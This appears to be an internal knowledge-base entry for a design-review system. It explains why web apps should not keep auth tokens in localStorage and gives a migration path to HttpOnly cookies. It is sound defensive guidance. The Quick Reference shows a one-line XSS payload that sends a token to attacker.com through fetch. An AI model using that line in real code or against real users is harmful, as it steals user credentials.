---
kb_id: design-pushback/localStorage-for-auth-tokens
version: 1
tags: [design-pushback, security, web, auth, high-severity]
related:
  - security-dev/auth-patterns
  - architecture/discipline/error-handling-discipline
status: active+enforced
pattern: |
  Storing authentication tokens (JWT, session ID, refresh token, API key)
  in browser localStorage or sessionStorage in a web application.
severity: HIGH
applies_when:
  intent: [build, plan]
  domain: [web, mobile]
  feature_keywords:
    - auth
    - authentication
    - login
    - session
    - JWT
    - token
    - cookie
    - "remember me"
    - oauth
applies_NOT_when:
  - "public client only — no privileged operations"
  - "ephemeral access tokens with seconds-to-minutes TTL + sender-constrained binding"
  - "explicitly accepting XSS-equivalent-to-account-takeover risk model"
preferred_alternative:
  - "HttpOnly + Secure + SameSite=Lax/Strict cookies set by the backend"
  - "For SPA-friendly auth: cookie-based session ID + backend-rendered CSRF token"
  - "For mobile: platform secure-storage (Keychain on iOS, Keystore on Android)"
why_better: |
  - **XSS containment**: HttpOnly cookies are not readable from JavaScript.
    A single XSS bug (one vulnerable third-party script, one
    `dangerouslySetInnerHTML` slip) in a localStorage-token app exfiltrates
    the token immediately. The same bug in an HttpOnly-cookie app can
    perform CSRF actions but cannot leak the credential.
  - **No accidental log/telemetry leak**: localStorage contents land in
    error-tracking payloads, session-replay tools (LogRocket, FullStory,
    PostHog), and debug-toolbar dumps by default. Cookies don't unless
    explicitly captured.
  - **Same-origin policy enforcement**: cookies respect domain/path scoping
    declared at set time. localStorage is just per-origin; subdomains and
    paths share access.
  - **CSRF mitigation via SameSite=Strict**: modern browsers block
    cross-site cookie attachment, eliminating most CSRF without needing
    server-side token-matching.
  - **Auto-expiry via Max-Age**: cookies expire by browser policy.
    localStorage entries persist until explicitly removed (or quota
    pressure evicts them, which is unpredictable).
  - **Network-level security**: cookies with Secure flag refuse to send
    over plaintext HTTP. localStorage tokens get attached via Authorization
    header to whatever URL the JS code constructs — no flag-based defense.
override_requires: |
  Explicit acknowledgment of:
  - Your XSS surface is "equivalent to account takeover" — a single
    XSS exploits a full credential theft, not just CSRF
  - All third-party scripts (analytics, fonts, ads, monitoring) become
    part of your token-stealing TCB (trusted computing base)
  - Session-replay tools will capture the token in their payload by
    default; you must explicitly redact in their config
  - You accept that any XSS finding in a security audit becomes a
    P0 incident, not a P2 finding
  Or: state the token is sender-constrained (DPoP, mTLS) and TTL <
  120 seconds.
empirical_origin: |
  Industry-common anti-pattern. v2.8.2-run1's project (PDF-to-Tutorial)
  used cookie-based session (evan correctly chose this) but the surface
  is broadly affected; many tutorial-grade web apps use localStorage
  because OAuth library defaults often emit JWTs and SPA developers
  reach for localStorage as the obvious place. The pattern is so
  pervasive that the underlying OAuth spec discussions explicitly
  call it out — IETF draft-bertocci-oauth2-tmi-bff is the recent
  consensus document.
---

## Quick Reference

**The anti-pattern**: A web app authenticates a user, gets a JWT (or session
ID, or API key) back from the auth server, and stores it in
`localStorage.setItem('token', ...)`. Subsequent API calls attach it via
`Authorization: Bearer <token>` header read from localStorage.

**Why it bites**: this works perfectly until the first XSS bug. Then the
attacker exfiltrates the token in a single line of JavaScript:
`fetch('//attacker.com/?t=' + localStorage.getItem('token'))`. The user's
account is owned. There's no recovery short of revoking + reissuing all
tokens.

**The fix**: backend sets the session cookie with `HttpOnly; Secure;
SameSite=Lax`. Frontend stops touching tokens entirely — the browser
attaches the cookie automatically on same-origin requests. CSRF is
mitigated by SameSite. Token theft requires breaking out of HttpOnly
(browser-level vulnerability, not application-level).

## Full content

### The XSS surface argument

Every web app has SOME XSS surface, even if minimal:

- Third-party CDN scripts (analytics, fonts, A/B test tools)
- User-generated content rendering (anywhere `innerHTML` is used)
- Markdown renderers with insufficient sanitization
- `eval()` of any user-controlled input
- Browser extensions running in the page context
- Print-CSS rules that interpret user CSS strings

The question is not "do I have XSS?" — the question is "when an XSS hits,
what does the blast radius look like?".

- **localStorage tokens**: blast radius = full credential, exfiltrated in 1 fetch
- **HttpOnly cookies**: blast radius = whatever the attacker can do as the user during the open session, but the credential itself stays in the browser

The difference is whether your security incident is "rotate one user's
tokens, audit the session for damage" vs. "rotate ALL active tokens
because one of them was stolen and you don't know which".

### The CSRF argument (a counter-objection, addressed)

Devs sometimes reach for localStorage tokens to "avoid CSRF". This argument
is decreasingly relevant:

- `SameSite=Lax` (default in modern browsers) eliminates basic CSRF for
  state-changing requests
- `SameSite=Strict` is appropriate for sensitive operations (admin actions,
  payment)
- For deeply sensitive operations, double-submit cookies + CSRF tokens
  remain available

CSRF protection is solved at the cookie + browser layer in 2024+. There
is no longer a meaningful "but CSRF" argument for choosing localStorage.

### When localStorage IS acceptable

There ARE narrow contexts:

- **Sender-constrained tokens**: if the token is bound to the client (DPoP
  proof-of-possession, mTLS) AND has a TTL of seconds-to-minutes, theft
  becomes useless quickly.
- **Public-API client identifier**: not credentials. A `client_id` that
  identifies an app for analytics but doesn't grant any privileged access.
- **CSRF-protected cookie + separate "remember me" handle**: some
  architectures store a separate handle in localStorage that lets the user
  re-auth without a password, but the actual session credential remains in
  an HttpOnly cookie. The localStorage handle has lower power.

If you're not one of these, use HttpOnly cookies.

### Migration path (if you're already storing tokens client-side)

1. Backend: change login endpoint to set `Set-Cookie: session=<id>;
   HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=<ttl>`
2. Backend: middleware reads cookie + resolves session, attaches user to
   request context (replaces JWT-in-header decode)
3. Frontend: REMOVE `localStorage.getItem('token')` calls and the
   Authorization header attachment in your fetch wrapper
4. Frontend: ensure all API calls use `credentials: 'include'` or
   `credentials: 'same-origin'` (the latter is default for same-origin)
5. CSRF: enable `SameSite=Lax` on the cookie; add CSRF token to mutating
   forms if you need defense-in-depth
6. Audit: search codebase for `localStorage` references; remove all
   token-related ones
7. Deploy + revoke all previously-issued JWTs (force re-login)

The frontend code gets SMALLER, not bigger — removing the manual token
attachment is a net code reduction.

### References

- OWASP Top 10 — A07:2021 Identification and Authentication Failures
- IETF draft-ietf-oauth-browser-based-apps — best current practice for
  OAuth in browsers (favors backend-for-frontend + HttpOnly cookies)
- "Please stop using localStorage for tokens" (industry-common discussion,
  search the title for multiple write-ups)
- MDN Set-Cookie documentation: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
